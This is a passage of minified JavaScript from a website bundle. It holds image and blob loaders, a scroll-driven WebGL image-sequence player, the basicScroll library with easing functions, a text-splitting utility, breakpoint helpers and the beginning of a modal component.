e=Zr(),i=gt();t.ImageLoader=class{constructor(t){this.imageSources=t,this.images={},this.maxRetries=3,this.decodeAfterFetch=!1,this.onEachImageLoaded=null}setLoadCallback(t){this.onEachImageLoaded=t}getImages(){return this.images}setDecodeAfterFetch(t){this.decodeAfterFetch=!e.is.firefox()&&t}load(){return new Promise((t=>{let e=this.imageSources.map((t=>this.fetchImage(t)));Promise.all(e).then((()=>{t(this.images)}))}))}ping(){return new Promise((t=>{let e=this.imageSources.map((t=>this.pingSource(t)));Promise.all(e).then((()=>{t(this.imageSources)}))}))}pingSource(t,e=0){return new Promise((i=>{fetch(t).then((r=>{r.ok?i(t):++e>=this.maxRetries?i():this.pingSource(t,e)}))}))}fetchImage(t,e=0){return new Promise((i=>{fetch(t).then((r=>(r.ok||(++e>=this.maxRetries?i():this.fetchImage(t,e)),r.blob()))).then((e=>{let r=e,n=document.createElement("img");this.decodeAfterFetch&&"decode"in n?(n.src=URL.createObjectURL(r),n.decoding="async",n.decode().then((()=>{this.images[t]=n,this.onEachImageLoaded&&this.onEachImageLoaded(t,n),i()})).catch((e=>{n.onload=()=>{this.images[t]=n,this.onEachImageLoaded&&this.onEachImageLoaded(t,n),i()},n.src=URL.createObjectURL(r)}))):(n.onload=()=>{this.images[t]=n,this.onEachImageLoaded&&this.onEachImageLoaded(t,n),i()},n.src=URL.createObjectURL(r))}))}))}loadImageBitmaps(){return new Promise((t=>{let e=this.imageSources.map((t=>this.fetchImageBitmap(t)));Promise.all(e).then((()=>{t(this.images)}))}))}fetchImageBitmap(t,e=0){return new Promise((i=>{fetch(t).then((r=>(r.ok||(++e>=this.maxRetries?i():this.fetchImageBitmap(t,e)),r.blob()))).then((t=>createImageBitmap(t))).then((e=>{let r=e;this.images[t]=r,this.onEachImageLoaded&&this.onEachImageLoaded(t,r),i()}))}))}loadBitmapOrImage(){return e.is.supportingCreateImageBitmap()?this.loadImageBitmaps():this.load()}dispose(){for(var t in this.images){if(!this.images[t])return;this.images[t].close?this.images[t].close():(URL.revokeObjectURL(this.images[t]),i.dom.deleteImage(this.images[t]),this.images[t]=null)}this.images=null}}})),$w=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=gt();t.BlobLoader=class{constructor(t){this.imageSources=t,this.blobs={},this.images64={},this.maxRetries=3}load(){return new Promise((t=>{this.imageSources||t(this.blobs);let e=this.imageSources.map((t=>this.loadBlob(t)));Promise.all(e).then((()=>{t(this.blobs)}))}))}loadBlob(t,e=0){return new Promise((i=>{fetch(t).then((r=>{if(r.ok)return r.blob();++e>=this.maxRetries?i():this.loadBlob(t,e)})).then((e=>{this.blobs&&(this.blobs[t]=e),i(e)}))}))}loadBase64Images(){return new Promise((t=>{let e=this.imageSources.map((t=>this.loadBlobAsBase64Image(t)));Promise.all(e).then((()=>{t(this.images64)}))}))}loadBlobAsBase64Image(t,i=0){return new Promise((r=>{fetch(t).then((e=>{if(e.ok)return e.blob();++i>=this.maxRetries?r():this.loadBlobAsBase64Image(t,i)})).then((i=>{e.dom.makeBase64ImageFromBlob(i).then((e=>{this.images64[t]=e,r(i)}))}))}))}dispose(){this.imageSources=null,this.images64=null,this.blobs=null}}})),Dw=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=Ks();t.Fps=class{constructor(t){this.fps=t,this.locked=!0}setFps(t){this.fps=t}lock(t){this.locked=t}schedule(t){this.cancelSchedule(),this.scheduleTimeout=window.setTimeout((()=>{this.locked=!1,t(),this.locked=!0}),1e3/this.fps+1)}cancelSchedule(){this.scheduleTimeout&&window.clearTimeout(this.scheduleTimeout)}canRun(){if(this.cancelSchedule(),!this.locked)return!0;if(this.lastUpdateTime){return e.time.now()-this.lastUpdateTime>(0==this.fps?0:1e3/this.fps)&&(this.lastUpdateTime=e.time.now(),!0)}return this.lastUpdateTime?void 0:(this.lastUpdateTime=e.time.now(),!0)}}})),Fw=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});t.webgl=class{static createProgram(t,e,i){let r=t.createProgram(),n=t.createShader(t.VERTEX_SHADER);t.shaderSource(n,e),t.compileShader(n);let s=t.createShader(t.FRAGMENT_SHADER);return t.shaderSource(s,i),t.compileShader(s),t.attachShader(r,n),t.deleteShader(n),t.attachShader(r,s),t.deleteShader(s),t.linkProgram(r),r}static createVbo(t,e){var i=t.createBuffer();return t.bindBuffer(t.ARRAY_BUFFER,i),t.bufferData(t.ARRAY_BUFFER,new Float32Array(e),t.STATIC_DRAW),i}static createTextureFromImage(t,e){var i=t.createTexture();return t.pixelStorei(t.UNPACK_PREMULTIPLY_ALPHA_WEBGL,!0),t.bindTexture(t.TEXTURE_2D,i),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_WRAP_S,t.CLAMP_TO_EDGE),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_WRAP_T,t.CLAMP_TO_EDGE),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_MIN_FILTER,t.LINEAR),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_MAG_FILTER,t.LINEAR),t.texImage2D(t.TEXTURE_2D,0,t.RGBA,t.RGBA,t.UNSIGNED_BYTE,e),i}static deleteTexture(t,e){t.deleteTexture(e)}}})),Ba=st((t=>{"use strict";var e=t&&t.__awaiter||function(t,e,i,r){return new(i||(i=Promise))((function(n,s){function o(t){try{l(r.next(t))}catch(t){s(t)}}function a(t){try{l(r.throw(t))}catch(t){s(t)}}function l(t){t.done?n(t.value):new i((function(e){e(t.value)})).then(o,a)}l((r=r.apply(t,e||[])).next())}))};Object.defineProperty(t,"__esModule",{value:!0});var i=fs(),r=Zr(),n=pn(),s=Yl(),o=$w(),a=di(),l=Nt(),h=rc(),c=Kl(),u=Dw(),d=Fw();t.fragShader="\n    precision mediump float;\n    uniform sampler2D u_image;\n    // texCoords passed in from the vertex shader.\n    varying vec2 v_texCoord;\n    void main() {\n      gl_FragColor = texture2D(u_image, v_texCoord);\n    }\n",t.vertShader="\n    attribute vec2 a_position;\n    uniform mat3 u_matrix;\n    varying vec2 v_texCoord;\n    void main() {\n      gl_Position = vec4(u_matrix * vec3(a_position, 1), 1);\n      v_texCoord = a_position;\n    }\n",t.WebGlImageSequenceErrors={NO_ELEMENT:"An element is required for webgl image sequence",NO_IMAGE_SETS:"Image sets are required for webgl image sequence",NO_IMAGES:"There are no images defined in your webgl image sequence image set"};t.WebGlImageSequence=class{constructor(e,i,o,a){if(this.lerpAmount=1,this.element=e,!e)throw new Error(t.WebGlImageSequenceErrors.NO_ELEMENT);if(!i)throw new Error(t.WebGlImageSequenceErrors.NO_IMAGE_SETS);this.imageSets=i,this.activeImageSet=null,this.blobCache={},this.options=o,this.isPlaying=!1,this.canvasElement=document.createElement("canvas"),this.options&&this.options.ariaLabel?(this.canvasElement.setAttribute("aria-label",this.options.ariaLabel),this.canvasElement.setAttribute("role","img")):this.canvasElement.setAttribute("aria-hidden","true"),this.gl=this.canvasElement.getContext("webgl",{antialias:!1,depth:!1}),this.program=d.webgl.createProgram(this.gl,t.vertShader,t.fragShader),this.dpr=n.func.setDefault(a,window.devicePixelRatio||1),this.canvasWidth=0,this.canvasHeight=0,this.imageNaturalHeight=0,this.imageNaturalWidth=0,this.currentFrame=0,this.lastDrawSource=null,this.targetFrame=0,this.containScale=null,this.disposed=!1,this.fps=new u.Fps(r.is.safari()?30:60),this.cacheImage=new Image,this.rafTimer=null,this.multiInterpolate=null,this.blobLoader=null,this.progress=null,this.playDefer=null,this.domWatcher=new l.DomWatcher,this.domWatcher.add({element:window,on:"smartResize",callback:()=>{this.resize(),this.flush(),this.lastDrawSource=null,this.fps.lock(!1),this.lastRenderSource&&this.draw(this.lastRenderSource),this.fps.lock(!0)},id:"resize",eventOptions:{passive:!0}}),this.domWatcher.run("resize"),this.domWatcher.add({element:window,on:"smartResize",callback:()=>{this.getSourceThatShouldLoad(this.imageSets)!==this.activeImageSet&&(this.loadNewSet(this.imageSets),this.load().then((()=>{this.lastDrawSource=null,this.fps.lock(!1),this.renderByProgress(this.progress||0),this.fps.lock(!0)})))},id:"image-set-resize",eventOptions:{passive:!0}}),this.element.appendChild(this.canvasElement),this.readyPromise=new s.Defer,this.loadNewSet(i),this.lastRenderSource=null,this.lastDrawSource=null,this.draw=n.func.runOnceOnChange(this.draw.bind(this))}setMultiInterpolation(t){this.multiInterpolate=new h.MultiInterpolate({interpolations:[{id:"sequence",progress:t}]})}resize(){this.canvasWidth=this.element.offsetWidth,this.canvasHeight=this.element.offsetHeight,this.canvasElement.width=this.element.offsetWidth*this.dpr,this.canvasElement.height=this.element.offsetHeight*this.dpr,this.canvasElement.style.width=this.canvasElement.width/this.dpr+"px",this.canvasElement.style.height=this.canvasElement.height/this.dpr+"px"}load(){return this.blobLoader&&this.activeImageSet?((()=>{this.blobLoader.load().then((t=>{this.blobCache=t,this.setImageDimensions().then((()=>{this.blobLoader.dispose(),this.readyPromise.resolve(t)}))}))})(),this.readyPromise.getPromise()):(window.setTimeout((()=>{this.readyPromise.resolve()})),this.readyPromise.getPromise())}loadNewSet(e){if(this.blobLoader&&this.blobLoader.dispose(),this.imageSets=e,this.activeImageSet=this.getSourceThatShouldLoad(this.imageSets),this.activeImageSet&&!r.is.array(this.activeImageSet.images))throw new Error(t.WebGlImageSequenceErrors.NO_IMAGES);this.activeImageSet?this.blobLoader=new o.BlobLoader(this.activeImageSet.images):this.blobLoader=null,this.blobCache={},this.flush(),this.lastRenderSource=null,this.readyPromise=new s.Defer}getSourceThatShouldLoad(t){let e=[];return t.forEach((t=>{t.when?t.when()&&e.push(t):e.push(t)})),e[0]}makeImage(t){return new Promise((e=>{t&&this.blobCache[t]?(URL.revokeObjectURL(this.cacheImage.src),this.cacheImage.onload=()=>{e(this.cacheImage)},this.cacheImage.src=URL.createObjectURL(this.blobCache[t])):e(null)}))}setImageDimensions(){return new Promise((t=>{let e=this.activeImageSet.images[0],r=this.blobCache[e];i.dom.makeImageFromBlob(r).then((e=>{let r=!e.naturalWidth;this.imageNaturalHeight=r?e.height:e.naturalHeight,this.imageNaturalWidth=r?e.width:e.naturalWidth,i.dom.deleteImage(e),e=null,t()}))}))}getActiveImages(){return this.activeImageSet.images}renderByProgress(t,e=!1){this.progress=a.mathf.clamp01(t),!this.isPlaying&&this.renderProgress(t,e)}renderProgress(t,e=!1){let i=a.mathf.clamp01(t);if(this.multiInterpolate&&!e){let t=this.multiInterpolate.calculate(i);i=a.mathf.clamp01(t.sequence)}if((i>=.95||i<=.05)&&this.flush(),this.activeImageSet){let t=this.activeImageSet.images.length-1,e=Math.ceil(a.mathf.lerp(0,t,i));this.renderFrame(e)}}renderFrame(t){if(!this.readyPromise.complete)return;this.targetFrame=t;let e=Math.abs(this.targetFrame-this.currentFrame);e>1&&!this.isPlaying&&this.lerpAmount<1?(this.currentFrame=a.mathf.lerp(this.currentFrame,this.targetFrame,this.lerpAmount),e=Math.abs(this.targetFrame-this.currentFrame),e>=.001&&window.requestAnimationFrame((()=>{this.renderFrame(this.targetFrame)}))):this.currentFrame=this.targetFrame;let i=this.activeImageSet.images[Math.round(this.currentFrame)];this.draw(i)}flush(){this.draw(""),this.draw(null)}draw(t){return e(this,void 0,void 0,(function*(){if(!t||this.disposed||t==this.lastDrawSource||!this.canvasWidth||!this.canvasHeight)return;if(this.lastDrawSource=t,!this.fps.canRun())return void this.fps.schedule((()=>{this.lastDrawSource=null,this.draw(t)}));let e=yield this.makeImage(t);if(!e)return;let i,n,s,o,l={width:this.imageNaturalWidth,height:this.imageNaturalHeight},h={width:this.canvasWidth,height:this.canvasHeight};if(this.options&&this.options.cover){let t=a.mathf.calculateBackgroundCover(h,l);this.options&&r.is.number(this.options.left)&&(t.xOffset=(h.width-l.width*t.scalar)*-this.options.left),this.options&&r.is.number(this.options.right)&&(t.xOffset=-(h.width-l.width*t.scalar),t.xOffset+=(h.width-l.width*t.scalar)*this.options.right),this.options&&r.is.number(this.options.bottom)&&(t.yOffset=-(h.height-l.height*t.scalar),t.yOffset+=(h.height-l.height*t.scalar)*this.options.bottom),this.options&&r.is.number(this.options.top)&&(t.yOffset=(h.height-l.height*t.scalar)*-this.options.top),i=-t.xOffset>>0,n=-t.yOffset>>0,s=l.width*t.scalar>>0,o=l.height*t.scalar>>0}else{this.containScale=a.mathf.calculateBackgroundContain(h,l);let t=(h.width-l.width*this.containScale)/2,e=(h.height-l.height*this.containScale)/2;this.options&&r.is.number(this.options.bottom)&&(e=h.height-l.height*this.containScale,this.options.bottomNoClip?e-=(h.height-l.height*this.containScale)*this.options.bottom:e-=h.height*this.options.bottom),this.options&&r.is.number(this.options.right)&&(t=h.width-l.width*this.containScale,this.options.rightNoClip?t-=(h.width-l.width*this.containScale)*this.options.right:t-=h.width*this.options.right),this.options&&r.is.number(this.options.top)&&(e=0,this.options.topNoClip?e=(h.height-l.height*this.containScale)*this.options.top:e+=this.options.top*h.height),this.options&&r.is.number(this.options.left)&&(t=0,this.options.leftNoClip?t=(h.width-l.width*this.containScale)*this.options.left:t+=this.options.left*h.width),i=t>>0,n=e>>0,s=l.width*this.containScale>>0,o=l.height*this.containScale>>0}let c=this.gl,u=this.program;var p=c.getAttribLocation(u,"a_position"),m=c.getUniformLocation(u,"u_matrix");c.useProgram(this.program),c.viewport(0,0,this.canvasWidth*this.dpr,this.canvasHeight*this.dpr),d.webgl.createVbo(c,[0,0,1,0,0,1,0,1,1,0,1,1]),c.enableVertexAttribArray(p),c.vertexAttribPointer(p,2,c.FLOAT,!1,0,0);var f=d.webgl.createTextureFromImage(c,e),g=i/this.canvasWidth*2-1,y=n/this.canvasHeight*-2+1,v=s/this.canvasWidth*2,_=o/this.canvasHeight*-2;c.uniformMatrix3fv(m,!1,[v,0,0,0,_,0,g,y,1]),c.drawArrays(c.TRIANGLES,0,6),d.webgl.deleteTexture(c,f),this.lastRenderSource=t}))}setSizingOptions(t){this.options=t}play(t,e,i){return this.stop(),this.rafTimer=new c.RafTimer((i=>{let r=a.mathf.interpolateRange(i,0,1,t,e);this.renderProgress(r)})),this.rafTimer.setDuration(i),this.playDefer=new s.Defer,this.rafTimer.onComplete((()=>{this.isPlaying=!1,this.playDefer.resolve(),this.rafTimer.dispose()})),this.rafTimer.play(),this.isPlaying=!0,this.playDefer.getPromise()}stop(){this.rafTimer&&this.rafTimer.pause(),this.rafTimer&&this.rafTimer.dispose(),this.playDefer&&this.playDefer.resolve()}getImageSize(){return{width:this.imageNaturalWidth,height:this.imageNaturalHeight}}dispose(){this.disposed=!0,this.stop(),this.domWatcher.dispose(),this.rafTimer&&this.rafTimer.dispose(),this.blobLoader&&this.blobLoader.dispose(),this.element=null,this.blobCache=null,this.canvasElement=null,i.dom.deleteImage(this.cacheImage),this.cacheImage=null,this.gl=null}}})),Gc=st(((t,e)=>{e.exports=new class{constructor(){this.supportsWebp=this.isWebpSupported()}isWebpSupported(){var t=document.createElement("canvas"),e=!1;return t.toDataURL("image/webp")&&(e=0==t.toDataURL("image/webp").indexOf("data:image/webp")),e}appendFifeWebpParam(t){return this.supportsWebp&&!t.endsWith("=rw")&&(t+="=rw"),t}}})),eE=st(((t,e)=>{!function(i){if("object"==typeof t&&void 0!==e)e.exports=i();else if("function"==typeof define&&define.amd)define([],i);else{("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).basicScroll=i()}}((function(){return function t(e,i,r){function n(o,a){if(!i[o]){if(!e[o]){var l="function"==typeof la&&la;if(!a&&l)return l(o,!0);if(s)return s(o,!0);var h=new Error("Cannot find module '"+o+"'");throw h.code="MODULE_NOT_FOUND",h}var c=i[o]={exports:{}};e[o][0].call(c.exports,(function(t){return n(e[o][1][t]||t)}),c,c.exports,t,e,i,r)}return i[o].exports}for(var s="function"==typeof la&&la,o=0;o<r.length;o++)n(r[o]);return n}({1:[function(t,e,i){e.exports=function(t){var e=2.5949095;return(t*=2)<1?t*t*((e+1)*t-e)*.5:.5*((t-=2)*t*((e+1)*t+e)+2)}},{}],2:[function(t,e,i){e.exports=function(t){var e=1.70158;return t*t*((e+1)*t-e)}},{}],3:[function(t,e,i){e.exports=function(t){var e=1.70158;return--t*t*((e+1)*t+e)+1}},{}],4:[function(t,e,i){var r=t("./bounce-out");e.exports=function(t){return t<.5?.5*(1-r(1-2*t)):.5*r(2*t-1)+.5}},{"./bounce-out":6}],5:[function(t,e,i){var r=t("./bounce-out");e.exports=function(t){return 1-r(1-t)}},{"./bounce-out":6}],6:[function(t,e,i){e.exports=function(t){var e=t*t;return t<4/11?7.5625*e:t<8/11?9.075*e-9.9*t+3.4:t<.9?4356/361*e-35442/1805*t+16061/1805:10.8*t*t-20.52*t+10.72}},{}],7:[function(t,e,i){e.exports=function(t){return(t*=2)<1?-.5*(Math.sqrt(1-t*t)-1):.5*(Math.sqrt(1-(t-=2)*t)+1)}},{}],8:[function(t,e,i){e.exports=function(t){return 1-Math.sqrt(1-t*t)}},{}],9:[function(t,e,i){e.exports=function(t){return Math.sqrt(1- --t*t)}},{}],10:[function(t,e,i){e.exports=function(t){return t<.5?4*t*t*t:.5*Math.pow(2*t-2,3)+1}},{}],11:[function(t,e,i){e.exports=function(t){return t*t*t}},{}],12:[function(t,e,i){e.exports=function(t){var e=t-1;return e*e*e+1}},{}],13:[function(t,e,i){e.exports=function(t){return t<.5?.5*Math.sin(13*Math.PI/2*2*t)*Math.pow(2,10*(2*t-1)):.5*Math.sin(-13*Math.PI/2*(2*t-1+1))*Math.pow(2,-10*(2*t-1))+1}},{}],14:[function(t,e,i){e.exports=function(t){return Math.sin(13*t*Math.PI/2)*Math.pow(2,10*(t-1))}},{}],15:[function(t,e,i){e.exports=function(t){return Math.sin(-13*(t+1)*Math.PI/2)*Math.pow(2,-10*t)+1}},{}],16:[function(t,e,i){e.exports=function(t){return 0===t||1===t?t:t<.5?.5*Math.pow(2,20*t-10):-.5*Math.pow(2,10-20*t)+1}},{}],17:[function(t,e,i){e.exports=function(t){return 0===t?t:Math.pow(2,10*(t-1))}},{}],18:[function(t,e,i){e.exports=function(t){return 1===t?t:1-Math.pow(2,-10*t)}},{}],19:[function(t,e,i){e.exports={backInOut:t("./back-in-out"),backIn:t("./back-in"),backOut:t("./back-out"),bounceInOut:t("./bounce-in-out"),bounceIn:t("./bounce-in"),bounceOut:t("./bounce-out"),circInOut:t("./circ-in-out"),circIn:t("./circ-in"),circOut:t("./circ-out"),cubicInOut:t("./cubic-in-out"),cubicIn:t("./cubic-in"),cubicOut:t("./cubic-out"),elasticInOut:t("./elastic-in-out"),elasticIn:t("./elastic-in"),elasticOut:t("./elastic-out"),expoInOut:t("./expo-in-out"),expoIn:t("./expo-in"),expoOut:t("./expo-out"),linear:t("./linear"),quadInOut:t("./quad-in-out"),quadIn:t("./quad-in"),quadOut:t("./quad-out"),quartInOut:t("./quart-in-out"),quartIn:t("./quart-in"),quartOut:t("./quart-out"),quintInOut:t("./quint-in-out"),quintIn:t("./quint-in"),quintOut:t("./quint-out"),sineInOut:t("./sine-in-out"),sineIn:t("./sine-in"),sineOut:t("./sine-out")}},{"./back-in":2,"./back-in-out":1,"./back-out":3,"./bounce-in":5,"./bounce-in-out":4,"./bounce-out":6,"./circ-in":8,"./circ-in-out":7,"./circ-out":9,"./cubic-in":11,"./cubic-in-out":10,"./cubic-out":12,"./elastic-in":14,"./elastic-in-out":13,"./elastic-out":15,"./expo-in":17,"./expo-in-out":16,"./expo-out":18,"./linear":20,"./quad-in":22,"./quad-in-out":21,"./quad-out":23,"./quart-in":25,"./quart-in-out":24,"./quart-out":26,"./quint-in":28,"./quint-in-out":27,"./quint-out":29,"./sine-in":31,"./sine-in-out":30,"./sine-out":32}],20:[function(t,e,i){e.exports=function(t){return t}},{}],21:[function(t,e,i){e.exports=function(t){return(t/=.5)<1?.5*t*t:-.5*(--t*(t-2)-1)}},{}],22:[function(t,e,i){e.exports=function(t){return t*t}},{}],23:[function(t,e,i){e.exports=function(t){return-t*(t-2)}},{}],24:[function(t,e,i){e.exports=function(t){return t<.5?8*Math.pow(t,4):-8*Math.pow(t-1,4)+1}},{}],25:[function(t,e,i){e.exports=function(t){return Math.pow(t,4)}},{}],26:[function(t,e,i){e.exports=function(t){return Math.pow(t-1,3)*(1-t)+1}},{}],27:[function(t,e,i){e.exports=function(t){return(t*=2)<1?.5*t*t*t*t*t:.5*((t-=2)*t*t*t*t+2)}},{}],28:[function(t,e,i){e.exports=function(t){return t*t*t*t*t}},{}],29:[function(t,e,i){e.exports=function(t){return--t*t*t*t*t+1}},{}],30:[function(t,e,i){e.exports=function(t){return-.5*(Math.cos(Math.PI*t)-1)}},{}],31:[function(t,e,i){e.exports=function(t){var e=Math.cos(t*Math.PI*.5);return Math.abs(e)<1e-14?1:1-e}},{}],32:[function(t,e,i){e.exports=function(t){return Math.sin(t*Math.PI/2)}},{}],33:[function(t,e,i){e.exports=function(t,e){e||(e=[0,""]),t=String(t);var i=parseFloat(t,10);return e[0]=i,e[1]=t.match(/[\d.\-\+]*\s*(.*)/)[1]||"",e}},{}],34:[function(t,e,i){"use strict";Object.defineProperty(i,"__esModule",{value:!0}),i.create=void 0;var r=s(t("parse-unit")),n=s(t("eases"));function s(t){return t&&t.__esModule?t:{default:t}}function o(t){return(o="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t})(t)}var a=[],l=function(){if(window.BasicScrollTop)return window.BasicScrollTop;var t=(document.scrollingElement||document.documentElement).scrollTop;return window.BasicScrollTop=t,window.addEventListener("scroll",(function(){window.BasicScrollTop=null}),{passive:!0,once:!0}),window.BasicScrollTop=t,window.BasicScrollTop},h=function(){return window.innerHeight||window.outerHeight},c=function(t){return!1===isNaN((0,r.default)(t)[0])},u=function(t){var e=(0,r.default)(t);return{value:e[0],unit:e[1]}},d=function(t){return null!==String(t).match(/^[a-z]+-[a-z]+$/)},p=function(t,e){return!0===t?e.elem:t instanceof HTMLElement?e.direct:e.global},m=function(t,e){var i=arguments.length>2&&void 0!==arguments[2]?arguments[2]:l(),r=arguments.length>3&&void 0!==arguments[3]?arguments[3]:h(),n=e.getBoundingClientRect(),s=t.match(/^[a-z]+/)[0],o=t.match(/[a-z]+$/)[0],a=0;return"top"===o&&(a-=0),"middle"===o&&(a-=r/2),"bottom"===o&&(a-=r),"top"===s&&(a+=n.top+i),"middle"===s&&(a+=n.top+i+n.height/2),"bottom"===s&&(a+=n.top+i+n.height),"".concat(a,"px")};i.create=function(t){var e=null,i=null,r={getData:function(){return e},calculate:function(){e=function(){var t=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};if(null==(t=Object.assign({},t)).inside&&(t.inside=function(){}),null==t.outside&&(t.outside=function(){}),null==t.direct&&(t.direct=!1),null==t.track&&(t.track=!0),null==t.props&&(t.props={}),null==t.from)throw new Error("Missing property `from`");if(null==t.to)throw new Error("Missing property `to`");if("function"!=typeof t.inside)throw new Error("Property `inside` must be undefined or a function");if("function"!=typeof t.outside)throw new Error("Property `outside` must be undefined or a function");if("boolean"!=typeof t.direct&&!(t.direct instanceof HTMLElement))throw new Error("Property `direct` must be undefined, a boolean or a DOM element/node");if(!0===t.direct&&null==t.elem)throw new Error("Property `elem` is required when `direct` is true");if("boolean"!=typeof t.track)throw new Error("Property `track` must be undefined or a boolean");if("object"!==o(t.props))throw new Error("Property `props` must be undefined or an object");if(null==t.elem){if(!1===c(t.from))throw new Error("Property `from` must be a absolute value when no `elem` has been provided");if(!1===c(t.to))throw new Error("Property `to` must be a absolute value when no `elem` has been provided")}else!0===d(t.from)&&(t.from=m(t.from,t.elem)),!0===d(t.to)&&(t.to=m(t.to,t.elem));return t.from=u(t.from),t.to=u(t.to),t.props=Object.keys(t.props).reduce((function(e,i){var r=Object.assign({},t.props[i]);if(!1===c(r.from))throw new Error("Property `from` of prop must be a absolute value");if(!1===c(r.to))throw new Error("Property `from` of prop must be a absolute value");if(r.from=u(r.from),r.to=u(r.to),null==r.timing&&(r.timing=n.default.linear),"string"!=typeof r.timing&&"function"!=typeof r.timing)throw new Error("Property `timing` of prop must be undefined, a string or a function");if("string"==typeof r.timing&&null==n.default[r.timing])throw new Error("Unknown timing for property `timing` of prop");return"string"==typeof r.timing&&(r.timing=n.default[r.timing]),e[i]=r,e}),{}),t}(t)},update:function(){var t=l();if(t!==i){var e=function(t){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:l(),i=t.getData(),r=i.to.value-i.from.value,n=(e-i.from.value)/(r/100),s=Math.min(Math.max(n,0),100),o=p(i.direct,{global:document.documentElement,elem:i.elem,direct:i.direct}),a=Object.keys(i.props).reduce((function(t,e){var r=i.props[e],n=r.from.unit||r.to.unit,o=r.from.value-r.to.value,a=r.timing(s/100),l=r.from.value-o*a,h=Math.round(1e4*l)/1e4;return t[e]=h+n,t}),{}),h=n<0||n>100;return!0==(n>=0&&n<=100)&&i.inside(t,n,a),!0===h&&i.outside(t,n,a),{elem:o,props:a}}(r,t);(function(t,e){Object.keys(e).forEach((function(i){return function(t,e){t.style.setProperty(e.key,e.value)}(t,{key:i,value:e[i]})}))})(e.elem,e.props),i=t}},destroy:function(){a[s]=void 0}},s=a.push(r)-1;return r.calculate(),r}},{eases:19,"parse-unit":33}]},{},[34])(34)}))})),Rx=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=fs();t.TextSplit=class{constructor(t){if(this.config=t,this.convertSpacesToNbsp=" "==this.config.split,this.sups=Array.from(this.config.element.querySelectorAll("sup")),this.sups.forEach((t=>{e.dom.removeElement(t)})),this.originalText=this.config.element.textContent,this.convertSpacesToNbsp){var i=new RegExp(String.fromCharCode(160),"g");this.originalText=this.originalText.replace(i," ")}this.splits=this.originalText.trim().split(this.config.split)}split(){this.config.element.innerHTML="",this.splits.forEach(((t,i)=>{this.convertSpacesToNbsp&&i!==this.splits.length-1&&(t+="&nbsp;");let r=e.dom.createElementFromString(`<span>${t}</span>`);e.dom.setCssVariable(r,"--item-index",i+""),this.config.element.appendChild(r)})),this.sups&&this.sups.forEach(((t,i)=>{let r=e.dom.createElementFromString("<span></span>");e.dom.setCssVariable(r,"--item-index",this.splits.length+i+""),r.appendChild(t),this.config.element.appendChild(r)})),e.dom.setCssVariable(this.config.element,"--item-total-count",this.splits.length+""),this.config.element.classList.add("text-split-set")}}})),Wm=ye(Yv()),ple=ye(Kv()),mle=ye(ey()),gle=ye(iy()),JR={TABLET:768,DESKTOP:1024,DESKTOP_LARGE:1230,IS_DESKTOP_LARGE:()=>window.innerWidth>=1230,IS_DESKTOP:()=>window.innerWidth>=1024,IS_DESKTOP_OR_TABLET:()=>window.innerWidth>=768,IS_MOBILE:()=>window.innerWidth<768,isPortrait:()=>window.innerWidth<=window.innerHeight,isLandscape:()=>window.innerWidth>window.innerHeight,isDesktopLarge:()=>window.innerWidth>=1230,isDesktop:()=>window.innerWidth>=1024,isDesktopOrTablet:()=>window.innerWidth>=768,isTabletPortrait:()=>window.innerWidth>=768&&window.innerWidth<1024&&window.innerHeight>window.innerWidth,isTabletOrMobile:()=>window.innerWidth<1024,isMobile:()=>window.innerWidth<768,isDsTabletLt:()=>window.innerWidth<=1023},rt=JR,Py=ye(gt()),Oy=class{constructor(){this.resizeListeners=[],this.ticking=!1;this.windowResizeDisposer=Py.bom.smartResize((t=>{this.resize()}),{passive:!0})}addListener(t){this.resizeListeners.push(t)}removeListener(t){this.resizeListeners=this.resizeListeners.filter((e=>e!==t))}update(){this.resizeListeners.forEach((t=>{t()})),this.ticking=!1}resize(){this.ticking||(window.requestAnimationFrame((()=>{this.update()})),this.ticking=!0)}dispose(){this.resizeListeners=[],this.windowResizeDisposer&&this.windowResizeDisposer()}},RM=()=>{window.MQN_RESIZER||(window.MQN_RESIZER=new Oy,document.addEventListener("mannequinImpendingNavigation",(()=>{window.MQN_RESIZER&&(window.MQN_RESIZER.scrollListeners_=[])})))},Ry=RM,My=class{static preventDefault(t){(t=t||window.event).preventDefault&&t.preventDefault(),t.returnValue=!1}static disableScroll(){window.addEventListener("DOMMouseScroll",this.preventDefault,!1),window.onwheel=this.preventDefault,window.onmousewheel=document.onmousewheel=this.preventDefault,window.ontouchmove=this.preventDefault}static enableScroll(){window.removeEventListener("DOMMouseScroll",this.preventDefault,!1),window.onmousewheel=document.onmousewheel=null,window.onwheel=null,window.ontouchmove=null}},eo=My,bd=ye(nc()),te={mqnCssName:t=>""+t},Sf=ye(Dy()),Uy=ye(Fy()),Af=ye(qy()),Cf=ye(Wy()),BM={className:"ak-modal",transitionDuration:300,visibilityDuration:0,onModalOpen:()=>{},onModalClose:()=>{},onModalDispose:()=>{}},ac=Uy.default.createDom,gn=class{static getClassName(t){return t.className}static generateAttributes(t){let e=gn.getClassName(t);return Object.freeze({ACTIVE_ID:`data-${e}-active-id`,BASE:`data-${e}`,CLOSE:`data-${e}-x`,ID:`data-${e}-id`})}static generateCssClasses(t){let e=gn.getClassName(t);return Object.freeze({BASE:`${e}`,CLOSE:`${e}-x`,CONTENT:`${e}-content`,ENTER_MODIFIED:`${e}--enter`,ENABLED_MODIFIED:`${e}--enabled`,EXIT_MODIFIED:`${e}--exit`,MASK:`${e}-mask`,VISIBLE_MODIFIED:`${e}--visible`})}constructor(t){this.config=t,this.timers_=[],this.attributes_=gn.generateAttributes(t),this.cssClasses_=gn.generateCssClasses(t),this.closeEl_=null,this.modalElement_=null,this.init_()}init_(){this.initDom_(),Af.default.addDelegatedListener(document,"click",this.getDelegateClickHandler_()),this.initStateFromHash_()}delegateClickHandler_(t,e){this.handleClickToOpenModal_(t,e),this.handleClickToCloseModal_(t)}getDelegateClickHandler_(){return 